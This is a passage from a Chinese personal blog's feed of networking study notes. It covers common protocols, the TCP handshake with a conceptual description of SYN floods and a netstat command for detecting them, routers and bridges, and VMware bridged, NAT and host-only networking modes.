Protocol）</h4><p>POP 用于从电子邮件服务器向个人电脑下载电子邮件。</p><hr><h4 id="FTP-文件传输协议（File-Transfer-Protocol）"><a href="#FTP-文件传输协议（File-Transfer-Protocol）" class="headerlink" title="FTP - 文件传输协议（File Transfer Protocol）"></a>FTP - 文件传输协议（File Transfer Protocol）</h4><p>FTP 负责计算机之间的文件传输。</p><hr><h4 id="NTP-网络时间协议（Network-Time-Protocol）"><a href="#NTP-网络时间协议（Network-Time-Protocol）" class="headerlink" title="NTP - 网络时间协议（Network Time Protocol）"></a>NTP - 网络时间协议（Network Time Protocol）</h4><p>NTP 用于在计算机之间同步时间（钟）。</p><hr><h4 id="DHCP-动态主机配置协议（Dynamic-Host-Configuration-Protocol）"><a href="#DHCP-动态主机配置协议（Dynamic-Host-Configuration-Protocol）" class="headerlink" title="DHCP - 动态主机配置协议（Dynamic Host Configuration Protocol）"></a>DHCP - 动态主机配置协议（Dynamic Host Configuration Protocol）</h4><p>DHCP 用于向网络中的计算机分配动态 IP 地址。</p><hr><h4 id="SNMP-简单网络管理协议（Simple-Network-Management-Protocol）"><a href="#SNMP-简单网络管理协议（Simple-Network-Management-Protocol）" class="headerlink" title="SNMP - 简单网络管理协议（Simple Network Management Protocol）"></a>SNMP - 简单网络管理协议（Simple Network Management Protocol）</h4><p>SNMP 用于计算机网络的管理。</p><hr><h4 id="LDAP-轻量级的目录访问协议（Lightweight-Directory-Access-Protocol）"><a href="#LDAP-轻量级的目录访问协议（Lightweight-Directory-Access-Protocol）" class="headerlink" title="LDAP - 轻量级的目录访问协议（Lightweight Directory Access Protocol）"></a>LDAP - 轻量级的目录访问协议（Lightweight Directory Access Protocol）</h4><p>LDAP 用于从因特网搜集关于用户和电子邮件地址的信息。</p><hr><h4 id="ICMP-因特网消息控制协议（Internet-Control-Message-Protocol）"><a href="#ICMP-因特网消息控制协议（Internet-Control-Message-Protocol）" class="headerlink" title="ICMP - 因特网消息控制协议（Internet Control Message Protocol）"></a>ICMP - 因特网消息控制协议（Internet Control Message Protocol）</h4><p>ICMP 负责网络中的错误处理。</p><hr><h4 id="ARP-地址解析协议（Address-Resolution-Protocol）"><a href="#ARP-地址解析协议（Address-Resolution-Protocol）" class="headerlink" title="ARP - 地址解析协议（Address Resolution Protocol）"></a>ARP - 地址解析协议（Address Resolution Protocol）</h4><p>ARP - 用于通过 IP 来查找基于 IP 地址的计算机网卡的硬件地址。</p><hr><h4 id="RARP-反向地址转换协议（Reverse-Address-Resolution-Protocol）"><a href="#RARP-反向地址转换协议（Reverse-Address-Resolution-Protocol）" class="headerlink" title="RARP - 反向地址转换协议（Reverse Address Resolution Protocol）"></a>RARP - 反向地址转换协议（Reverse Address Resolution Protocol）</h4><p>RARP 用于通过 IP 查找基于硬件地址的计算机网卡的 IP 地址。</p><hr><h4 id="BOOTP-自举协议（Boot-Protocol）"><a href="#BOOTP-自举协议（Boot-Protocol）" class="headerlink" title="BOOTP - 自举协议（Boot Protocol）"></a>BOOTP - 自举协议（Boot Protocol）</h4><p>BOOTP 用于从网络启动计算机。</p><hr><h4 id="PPTP-点对点隧道协议（Point-to-Point-Tunneling-Protocol）"><a href="#PPTP-点对点隧道协议（Point-to-Point-Tunneling-Protocol）" class="headerlink" title="PPTP - 点对点隧道协议（Point to Point Tunneling Protocol）"></a>PPTP - 点对点隧道协议（Point to Point Tunneling Protocol）</h4><p>PPTP 用于私人网络之间的连接（隧道）。</p><h2 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP/IP"></a>TCP/IP</h2><p>TCP/IP 是用于因特网 (Internet) 的通信协议。</p><p>TCP/IP 是供已连接因特网的计算机进行通信的通信协议。</p><p>TCP/IP 指传输控制协议/网际协议（<em>T</em>ransmission <em>C</em>ontrol <em>P</em>rotocol / <em>I</em>nternet <em>P</em>rotocol）。</p><p>TCP/IP 定义了电子设备（比如计算机）如何连入因特网，以及数据如何在它们之间传输的标准。</p><h3 id="TCP-使用固定的连接"><a href="#TCP-使用固定的连接" class="headerlink" title="TCP 使用固定的连接"></a>TCP 使用固定的连接</h3><p>TCP 用于应用程序之间的通信。</p><p>当应用程序希望通过 TCP 与另一个应用程序通信时，它会发送一个通信请求。这个请求必须被送到一个确切的地址。在双方”握手”之后，TCP 将在两个应用程序之间建立一个全双工 (full-duplex) 的通信。</p><p>这个全双工的通信将占用两个计算机之间的通信线路，直到它被一方或双方关闭为止。</p><p>UDP 和 TCP 很相似，但是更简单，同时可靠性低于 TCP。</p><h3 id="IP-是无连接的"><a href="#IP-是无连接的" class="headerlink" title="IP 是无连接的"></a>IP 是无连接的</h3><p>IP 用于计算机之间的通信。</p><p>IP 是无连接的通信协议。它不会占用两个正在通信的计算机之间的通信线路。这样，IP 就降低了对网络线路的需求。每条线可以同时满足许多不同的计算机之间的通信需要。</p><p>通过 IP，消息（或者其他数据）被分割为小的独立的包，并通过因特网在计算机之间传送。</p><p>IP 负责将每个包路由至它的目的地。</p><h3 id="TCP-IP协同而分工工作"><a href="#TCP-IP协同而分工工作" class="headerlink" title="TCP/IP协同而分工工作"></a><strong>TCP/IP协同而分工工作</strong></h3><p>TCP/IP 意味着 TCP 和 IP 在一起协同工作。但他们分工又十分分明，简单来说：</p><p>TCP 负责应用软件（比如浏览器）和网络软件之间的通信。</p><p>IP 负责计算机之间的通信。</p><p>TCP 负责将数据分割并装入 IP 包，然后在它们到达的时候重新组合它们。</p><p>IP 负责将包发送至接受者。</p><h4 id="TCP三次握手、四次挥手"><a href="#TCP三次握手、四次挥手" class="headerlink" title="TCP三次握手、四次挥手"></a>TCP三次握手、四次挥手</h4><hr><ul><li>所谓<strong>三次握手</strong>(Three-way Handshake)，是指建立一个TCP连接时，需要客户端和服务器总共发送3个数据包。</li></ul><p>三次握手的目的是连接服务器指定端口，建立TCP连接,并同步连接双方的序列号和确认号并交换 TCP 窗口大小信息。<br><strong>第一次握手：</strong>Client向Server发送SYN握手包（seq=x），进入SYN_SEND状态<br><strong>第二次握手：</strong>Server返回SYN+ACK确认包(seq=y,ack=x+1)，进入SYN_RECV状态<br><strong>第三次握手：</strong>Client再次发送ACK确认包(ack=y+1),此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。</p><p>完成三次握手，客户端与服务器开始传送数据。</p><h4 id="图文详解："><a href="#图文详解：" class="headerlink" title="图文详解："></a>图文详解：</h4><p><img src="http://www.centos.bz/wp-content/uploads/2012/08/100327002629.png" alt="100327002629"><br> 第一次握手:<br> 客户端发送一个TCP的<strong>SYN标志位置为1</strong>的包（表明这是一个<strong>SYN包</strong>）指明客户打算连接的服务器的端口，以及<strong>初始序号X</strong>,保存在包头的序列号(<strong>Seq</strong>uence Number)字段里。<br><img src="http://www.centos.bz/wp-content/uploads/2012/08/100327002911.png" alt="100327002911"><br> 第二次握手:<br> 服务器发回<strong>SYN+ACK确认包</strong>应答。即<strong>SYN标志位和ACK标志位均为1</strong>同时，将确认序号(<strong>Ack</strong>nowledgement Number)设置为客户的初始序号加1，即X+1。并设置这个SYN+ACK确认包的序列号（seq）为<strong>Y</strong><br><img src="http://www.centos.bz/wp-content/uploads/2012/08/100327003054.png" alt="100327003054"></p><p>第三次握手.<br> 客户端发送一个<strong>ACK确认包</strong>（ <strong>SYN标志位为0,ACK标志位为1</strong>）。并且把服务器发来SYN+ACK确认包的序列号（seq）字段+1,放在确认序号字段中发送给对方。<br><img src="http://www.centos.bz/wp-content/uploads/2012/08/100327003214.png" alt="100327003214"></p><p>上面这个来回对对方发来的数据包的序列号seq的值+1再作为确认序号发送回去的过程，可以在一定程度上保证信息传递的完整性以及安全。</p><p><strong>SYN攻击</strong><br>   在三次握手过程中，服务器发送SYN-ACK之后，收到客户端的ACK之前的TCP连接称为半连接(half-open connect).此时服务器处于Syn_RECV状态.当收到ACK后，服务器转入ESTABLISHED状态.<br>  Syn攻击就是 攻击客户端  在短时间内伪造大量不存在的IP地址，向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直 至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。<br> Syn攻击是一个典型的<a href="https://www.centos.bz/tag/ddos/" target="_blank" rel="noopener">DDOS</a>攻击。检测SYN攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击.在<a href="http://www.centos.bz/" target="_blank" rel="noopener">Linux</a>下可以如下命令检测是否被Syn攻击</p><pre class="line-numbers language-shell"><code class="language-shell">netstat -n -p TCP | grep SYN_RECV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 一般较新的TCP/IP协议栈都对这一过程进行修正来防范Syn攻击，修改TCP协议实现。主要方法有SynAttackProtect保护机制、SYN cookies技术、增加最大半连接和缩短超时时间等.<br> 但是不能完全防范SYN攻击。</p><ul><li>所谓<strong>四次挥手</strong>(four-way handshake)，是指拆除一个TCP连接时，需要客户端和服务器总共发送4个数据包。</li></ul><p>与上面写的三次握手不同的是，客户端或服务器均可主动发起挥手动作。</p><p><strong>第一次挥手：</strong>主动方发送一个FIN，用来关闭主动方到被动方的数据传送</p><p><strong>第二次挥手：</strong>被动方收到这个FIN，它发回一个ACK，确认序号为收到的序号加1</p><p>这中间如果被动方还有数据没有发送完毕，可以继续发送，直到完成后，再接着进行第三次挥手（<strong>这也是为什么握手只要三次，挥手却需要四次</strong>）</p><p><strong>第三次挥手：</strong>被动方关闭与主动方的连接，发送一个FIN给主动方</p><p><strong>第四次挥手：</strong>主动方发回ACK报文确认，并将确认序号设置为收到序号加1</p><p><img src="http://www.centos.bz/wp-content/uploads/2012/08/100327022731.jpg" alt="100327022731"></p><p> 一般较新的TCP/IP协议栈都对这一过程进行修正来防范Syn攻击，修改tcp协议实现。主要方法有SynAttackProtect保护机制、SYN cookies技术、增加最大半连接和缩短超时时间等.<br> 但是不能完全防范syn攻击。</p><p>上图有疏漏，最后一个ACK包中的ACK应当等于Y+1。</p><h2 id="IP地址（IPv4）"><a href="#IP地址（IPv4）" class="headerlink" title="IP地址（IPv4）"></a>IP地址（IPv4）</h2><p>每个计算机必须有一个 IP 地址才能够连入因特网。</p><p>每个 IP 包必须有一个地址才能够发送到另一台计算机。</p><p>TCP/IP 使用 4 组数字（4个数字）来为计算机编址。每个计算机必须有一个唯一的 4 组数字的地址（IPv4地址）。</p><p>每组数字必须在 0 到 255（就是8位二进制数） 之间，并由点号隔开，比如：192.168.1.60。</p><p>所以一个ip地址实际上一个32位的二进制数，每八位用一个点号分开。</p><h3 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h3><p>下一代ip协议，为了应对IPv4地址日渐消耗殆尽的问题而设计的。暂且不表，因为我还没仔细了解</p><h2 id="TCP-IP协议四层模型"><a href="#TCP-IP协议四层模型" class="headerlink" title="TCP/IP协议四层模型"></a>TCP/IP协议四层模型</h2><p>TCP/IP协议是OSI体系结构的一种实现，但将OSI概念体系中的”会话层，表达层，应用层“合并为”应用层“，传输层和网络层基本不变，又将”数据链路层和物理层“归并成”网络接口层“，使其更简洁，便于实现。</p><h3 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h3><p>以太网协议规定，接入网络的设备都必须安装网络适配器，即网卡，数据包必须是从一块网卡传送到另一块网卡。而网卡地址就是数据包的发送地址和接收地址，有了MAC地址以后，<a href="https://baike.baidu.com/item/以太网/99684" target="_blank" rel="noopener">以太网</a>采用广播形式，把数据包发给该子网内所有主机，子网内每台主机在接收到这个包以后，都会读取首部里的目标MAC地址，然后和自己的MAC地址进行对比，如果相同就做下一步处理，如果不同，就丢弃这个包。 [4] </p><p>所以链路层的主要工作就是对电信号进行分组并形成具有特定意义的数据帧，然后以广播的形式通过物理介质发送给接收方。 [4] </p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p><strong>IP协议</strong></p><p>网络层引入了IP协议，制定了一套新地址，使得我们能够区分两台主机是否同属一个网络，这套地址就是网络地址，也就是所谓的IP地址。IP协议将这个32位的地址分为两部分，前面部分代表网络地址，后面部分表示该主机在局域网中的地址。如果两个IP地址在同一个子网内，则网络地址一定相同。为了判断IP地址中的网络地址，IP协议还引入了子网掩码，IP地址和子网掩码通过按位与运算后就可以得到网络地址。 [4] </p><p><strong>ARP协议</strong></p><p>即地址解析协议，是根据IP地址获取MAC地址的一个网络层协议。其工作原理如下：ARP首先会发起一个请求数据包，数据包的首部包含了目标主机的IP地址，然后这个数据包会在链路层进行再次包装，生成以太网数据包，最终由以太网广播给子网内的所有主机，每一台主机都会接收到这个数据包，并取出标头里的IP地址，然后和自己的IP地址进行比较，如果相同就返回自己的MAC地址，如果不同就丢弃该数据包。ARP接收返回消息，以此确定目标机的MAC地址；与此同时，ARP还会将返回的MAC地址与对应的IP地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。 [4] </p><p><strong>路由协议</strong></p><p>首先通过IP协议来判断两台主机是否在同一个<a href="https://baike.baidu.com/item/子网/1186929" target="_blank" rel="noopener">子网</a>中，如果在同一个子网，就通过ARP协议查询对应的MAC地址，然后以广播的形式向该子网内的主机发送数据包；如果不在同一个子网，以太网会将该数据包转发给本子网的网关进行路由。<a href="https://baike.baidu.com/item/网关/98992" target="_blank" rel="noopener">网关</a>是<a href="https://baike.baidu.com/item/互联网/199186" target="_blank" rel="noopener">互联网</a>上子网与子网之间的桥梁，所以网关会进行多次转发，最终将该数据包转发到目标IP所在的子网中，然后再通过ARP获取目标机MAC，最终也是通过广播形式将数据包发送给接收方。而完成这个路由协议的物理设备就是<a href="https://baike.baidu.com/item/路由器/108294" target="_blank" rel="noopener">路由器</a>，路由器扮演着交通枢纽的角色，它会根据信道情况，选择并设定路由，以最佳路径来转发数据包。 [4] </p><p>所以，网络层的主要工作是定义网络地址、区分网段、子网内MAC寻址、对于不同子网的数据包进行路由。 [4] </p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>链路层定义了主机的身份，即MAC地址，而网络层定义了IP地址，明确了主机所在的<a href="https://baike.baidu.com/item/网段/11026985" target="_blank" rel="noopener">网段</a>，有了这两个地址，数据包就从可以从一个主机发送到另一台主机。但实际上数据包是从一个主机的某个应用程序发出，然后由对方主机的应用程序接收。而每台电脑都有可能同时运行着很多个应用程序，所以当数据包被发送到主机上以后，是无法确定哪个应用程序要接收这个包。因此传输层引入了<a href="https://baike.baidu.com/item/UDP/571511" target="_blank" rel="noopener">UDP</a>协议来解决这个问题，为了给每个应用程序标识身份。</p><p>传输层协议负责解决数据传输问题，包括数据通行的可靠性问题。传输层依赖更底层的网络层来完成实际的数据传输，在TCP/IP网络协议中，负责可靠通信的传输层协议为TCP协议。<strong>而网络层一般用网络驱动来实现，普通的程序员不会涉及</strong>；在TCP/IP协议中，网络层的协议为IP协议。</p><p><strong>UDP协议</strong></p><p>UDP协议定义了端口，同一个主机上的每个应用程序都需要指定唯一的端口号，并且规定网络中传输的数据包必须加上端口信息，当数据包到达主机以后，就可以根据端口号找到对应的应用程序了。UDP协议比较简单，实现容易，但它没有确认机制，数据包一旦发出，无法知道对方是否收到，因此可靠性较差，为了解决这个问题，提高网络可靠性，TCP协议就诞生了。</p><p><strong>TCP协议</strong></p><p>TCP即传输控制协议，是一种面向连接的、可靠的、基于字节流的通信协议。简单来说TCP就是有确认机制的UDP协议，每发出一个数据包都要求确认，如果有一个数据包丢失，就收不到确认，发送方就必须重发这个数据包。为了保证传输的可靠性，TCP协议在UDP基础之上建立了三次对话的确认机制，即在正式收发数据前，必须和对方建立可靠的连接。TCP数据包和UDP一样，都是由首部和数据两部分组成，唯一不同的是，TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。 [4] </p><p>传输层的主要工作是定义<a href="https://baike.baidu.com/item/端口/103505" target="_blank" rel="noopener">端口</a>，标识应用程序身份，实现端口到端口的通信，TCP协议可以保证数据传输的可靠性。 [4] </p><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>理论上讲，有了以上三层协议的支持，数据已经可以从一个主机上的应用程序传输到另一台主机的应用程序了，但此时传过来的数据是字节流，不能很好的被程序识别，操作性差，因此，应用层定义了各种各样的协议来规范数据格式，常见的有<a href="https://baike.baidu.com/item/http/243074" target="_blank" rel="noopener">http</a>,ftp,<a href="https://baike.baidu.com/item/smtp/175887" target="_blank" rel="noopener">smtp</a>等，在请求<a href="https://baike.baidu.com/item/Header/688992" target="_blank" rel="noopener">Header</a>中，分别定义了请求数据格式Accept和响应数据格式Content-Type，有了这个规范以后，当对方接收到请求以后就知道该用什么格式来解析，然后对请求进行处理，最后按照请求方要求的格式将数据返回，请求端接收到响应后，就按照规定的格式进行解读。 [4] </p><p>所以应用层的主要工作就是定义数据格式并按照对应的格式解读数据。 [4] </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器和桥接器</title>
      <link href="/2020/11/21/2020-11-21-lu-you-qi-he-qiao-jie-qi/"/>
      <url>/2020/11/21/2020-11-21-lu-you-qi-he-qiao-jie-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h1><p>路由器在网络层。</p><p>路由器中的储存器里有一张路由表，里面存储着很多节点之间的最佳路由方案。但网络环境很复杂，有时还是需要动态路由。</p><h1 id="桥接器"><a href="#桥接器" class="headerlink" title="桥接器"></a>桥接器</h1><p>桥接器在在数据链路层。</p><p>交换机就是多端口桥接器。</p><p>桥接器在功能上与<a href="https://zh.wikipedia.org/wiki/集线器" target="_blank" rel="noopener">集线器</a>等其他用于连接网段的设备类似，不过后者工作在<a href="https://zh.wikipedia.org/wiki/物理层" target="_blank" rel="noopener">物理层</a>（OSI模型第1层）。</p><ul><li>网桥能够识别数据链路层中的数据帧，并将这些数据帧临时存储于内存，再重新生成信号作为一个全新的数据帧转发给相连的另一个网段（network segment）。由于能够对数据帧拆包、暂存、重新打包（称为存储转发机制 store-and-forward），网桥能够连接不同技术参数传输速率的数据链路，如连接10BASE-T与100BASE-TX。</li><li>数据帧中有一个位叫做FCS，用来通过<a href="https://zh.wikipedia.org/wiki/CRC32" target="_blank" rel="noopener">CRC</a>方式校验数据帧中的位。网桥可以检查FCS，将那些损坏的数据帧丢弃。</li><li>网桥在向其他网段转发数据帧时会做冲突检测控制。</li><li>网桥还能通过地址自学机制和过滤功能控制网络流量，具有OSI第2层<a href="https://zh.wikipedia.org/wiki/网络交换机" target="_blank" rel="noopener">网络交换机</a>功能。这称为transparent bridge，由<a href="https://zh.wikipedia.org/wiki/DEC" target="_blank" rel="noopener">DEC</a>在1980年代发明<a href="https://zh.wikipedia.org/wiki/橋接器#cite_note-4" target="_blank" rel="noopener">[4]</a>。其机制是网桥内部有一个数据库，最初没有数据。当网桥从一个网段收到一个数据帧，就会在数据库中登记（或者更新）数据帧的源地址属于这个网段，并检查数据包的目的地址。如果目的地址在数据库中属于另外一个网段，则网桥向该网段转发该数据帧；如果目的地址在数据库中没有记录，则网桥向除了源地址所在之外的其他所有网段转发（flood）该数据帧。</li><li>桥接器仅仅在不同网络之间有数据传输的时候才将数据转发到其他网络，不是像集线器那样对所有数据都进行广播。对于<a href="https://zh.wikipedia.org/wiki/以太网" target="_blank" rel="noopener">以太网</a>，“桥接”这一术语正式的含义是指符合<a href="https://zh.wikipedia.org/wiki/IEEE_802.1D" target="_blank" rel="noopener">IEEE 802.1D</a>标准的设备，即“网络切换”。桥接器可以分割网段，不似集线器仍是在为同一<a href="https://zh.wikipedia.org/w/index.php?title=碰撞域&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">碰撞域</a>，所以对带宽耗损较大。因桥接器透过其内之MAC表格，让发送帧不会通过，所以其称之为数据链接层操作之网络组件，可隔离碰撞。</li></ul><p>若有通信频繁的机器，则应置于同区之内，否则性能将降低。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机网络：桥接、NAT和Host-Only模式</title>
      <link href="/2020/11/20/2020-11-20-xu-ni-ji-wang-luo-qiao-jie-nat-he-host-only-mo-shi/"/>
      <url>/2020/11/20/2020-11-20-xu-ni-ji-wang-luo-qiao-jie-nat-he-host-only-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟机网络：桥接、NAT和Host-Only模式"><a href="#虚拟机网络：桥接、NAT和Host-Only模式" class="headerlink" title="虚拟机网络：桥接、NAT和Host-Only模式"></a>虚拟机网络：桥接、NAT和Host-Only模式</h1><p><img src="E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Cimage-20201120131717280.png" alt="image-20201120131717280"></p><p>上面这张图就是vmware虚拟网络编辑器上可以选择的三种虚拟机的网络模式：桥接，NAT和仅主机（Host-Only）</p><h2 id="桥接"><a href="#桥接" class="headerlink" title="桥接"></a>桥接</h2><p>桥接模式就是VMware通过VMnet0虚拟交换机将物理网卡和虚拟网卡进行桥接，“桥接”就是在数据链路层上将两个网络拼接起来的技术（桥接器，交换机）。这样物理网卡和虚拟网卡在网络拓扑上地位相等，也就是相当于在一个网段，物理网卡和虚拟网卡的ip地址在一个局域网里。这里可以让VMware自动设置，也可以手动设置虚拟网卡的ip地址，让它不会和局域网内的其它联网设备ip冲突。</p><p>这是物理机通过局域网ip访问本地网站（phpstudy默认主页），局域网ip为：192.168.0.106</p><p><img src="/img/image-20201121121534108.png" alt=""></p><p>这是ubuntu虚拟机通过局域网ip访问虚拟机本地网站（apache2默认主页），局域网ip为：192.168.0.107（这个ip紧跟物理机ip，它们在一个网段）</p><p><img src="/img/image-20201121123258281.png" alt="image-20201121123258281"></p><p>接下来放两张它们互相访问的图</p><p><img src="/img/image-20201121123534968.png" alt="image-20201121123534968"></p><p><img src="/img/image-20201121123559732.png" alt="image-20201121123559732"></p><p>这就很直观了</p><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>NAT英文全称是“Network Address Translation”，中文意思是“网络地址转换”，它是一个IETF(Internet Engineering Task  Force, Internet工程任务组)标准，允许一个整体机构以一个公用IP（Internet  Protocol）地址出现在Internet上。顾名思义，它是一种把内部私有网络地址（IP地址）翻译成合法网络IP地址的技术。</p><p>通俗的讲，NAT可以使一个局域网中所有主机对外使用一个公网ip，对内使用不同私有ip。其实就是我们现在使用的绝大部分无线路由器默认开启的功能，这就是为什么我们能使用多台设备连接到一个WiFi上，并使用一个“宽带”原因。</p><p>虚拟机的NAT模式下，我们的物理机就相当于这样以一个路由器，在虚拟机之间组成了一个“虚拟局域网”，所有NAT模式下的虚拟机拥有一个它们自己独有的，比物理机的私有ip更次一级的私有ip。</p><p>它们之间可以通过这个“更次一级的私有ip”互相访问，</p><p>kali虚拟机的ip为 192.168.197.129</p><p><img src="/img/image-20201121125655138.png" alt="kali虚拟机ip"></p><p>ubuntu虚拟机的ip为192.168.197.128，并访问kali的本地网站成功</p><p><img src="/img/image-20201121125922772.png" alt="ubuntu访问kali主页"></p><p><strong>但如果想要使物理机或局域网甚至外网访问虚拟机，必须在虚拟网络编辑器中设置静态端口映射</strong>，这在上一篇博客中已经写过了</p><h3 id="NAT技术类型"><a href="#NAT技术类型" class="headerlink" title="NAT技术类型"></a>NAT技术类型</h3><p>　　NAT有三种类型：静态NAT(Static NAT)、动态地址NAT(Pooled NAT)、网络地址端口转换NAPT（Port－Level NAT）。</p><pre><code>     根据不同的需要，三种NAT方案各有利弊。</code></pre><p>　　<strong>静态NAT</strong>设置起来是最为简单和最容易实现的一种，内部网络中的每个主机都被永久映射成外部网络中的某个合法的地址。而动态地址NAT则是在外部网络中定义了一系列的合法地址，采用动态分配的方法映射到内部网络。NAPT则是把内部地址映射到外部网络的一个IP地址的不同端口上。根据不同的需要，三种NAT方案各有利弊。</p><p>　　<strong>动态地址NAT</strong>只是转换IP地址，它为每一个内部的IP地址分配一个<strong>临时的外部IP地址</strong>，主要应用于拨号，对于频繁的远程联接也可以采用动态NAT。当远程用户联接上之后，动态地址NAT就会分配给他一个IP地址，用户断开时，这个IP地址就会被释放而留待以后使用。</p><p>　　<strong>网络地址端口转换NAPT</strong>（Network Address Port  Translation）是人们比较熟悉的一种转换方式（也就是上一篇文章写的设置静态端口映射的方式）。NAPT普遍应用于接入设备中，它可以将中小型的网络隐藏在一个合法的IP地址（私有或公有都行）后面。NAPT与动态地址NAT不同，它将内部连接映射到外部网络中的一个<strong>单独的IP地址</strong>上，同时在该地址上加上一个由NAT设备选定的TCP端口号。</p><h2 id="Host-Only"><a href="#Host-Only" class="headerlink" title="Host-Only"></a><strong>Host-Only</strong></h2><p> 在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的。</p><p>　　Host-Only的宗旨就是建立一个与外界隔绝的内部网络，来提高内网的安全性。这个功能或许对普通用户来说没有多大意义，但大型服务商会常常利用这个功能。如果你想为VMnet1网段提供路由功能，那就需要使用RRAS，而不能使用XP或2000的ICS，因为ICS会把内网的IP地址改为192.168.0.1，但虚拟机是不会给VMnet1虚拟网卡分配这个地址的，那么主机和虚拟机之间就不能通信了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物理机以及外网访问虚拟机的配置方法</title>
      <link href="/2020/11/19/2020-11-19-wu-li-ji-yi-ji-wai-wang-fang-wen-xu-ni-ji-de-pei-zhi-fang-fa/"/>
      <url>/2020/11/19/2020-11-19-wu-li-ji-yi-ji-wai-wang-fang-wen-xu-ni-ji-de-pei-zhi-fang-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="物理机以及外网访问虚拟机的配置方法"><a href="#物理机以及外网访问虚拟机的配置方法" class="headerlink" title="物理机以及外网访问虚拟机的配置方法"></a>物理机以及外网访问虚拟机的配置方法</h1><p>vmware虚拟机的虚拟网络配置有有三种模式：桥接、NAT和Host-Only。</p><p>一般情况下，这三种方式都能被物理主机访问，但只有桥接和NAT模式能够被外网访问。三种网络模式我在下篇文章再写，这篇文章记录一下配置桥接模式和NAT模式，让物理机和外网能够访问虚拟机的方法。</p><h3 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h3><p>桥接模式是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，物理网卡和虚拟网卡在拓扑图上处于同等地位，那么物理网卡和虚拟网卡就相当于处于同一个网段，虚拟交换机就相当于一台现实网络中的交换机,所以两个网卡的IP地址也要设置为同一网段。</p><p>也就是说相当于这时虚拟机和物理机同为局域网中的一个主机，他们在同一个D段里，也就是ip的前三段都是一样的，最后一段不同</p><p><img src="%5Cimg%5Cimage-20201119212813214.png" alt="image-20201119212813213"></p><p>点击右下角的“更改设置”</p><p><img src="%5Cimg%5Cimage-20201119212927918.png" alt="image-20201119212927918"></p><p>如果在局域网中使用，这里直接默认自动设置就行（会自动分配局域网ip以及dns服务器），点击最上面的桥接模式然后点击右下角的应用即可</p><p>如果试图在公网中使用，那么它需要你给它手动分配一个你个人使用的公网ip，然后设置好dns服务器</p><p>测试一下访问情况</p><p><img src="%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119213724.png" alt=""></p><p>这是ubuntu虚拟机本地访问localhost界面，并且查看到虚拟机的局域网ip为192.168.43.159</p><p><img src="%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119213759.png" alt=""></p><p>这是使用192.168.43.159这个ip在物理主机上访问的结果，成功访问到ubuntu主页</p><p>桥接模式访问成功</p><h3 id="NAT模式"><a href="#NAT模式" class="headerlink" 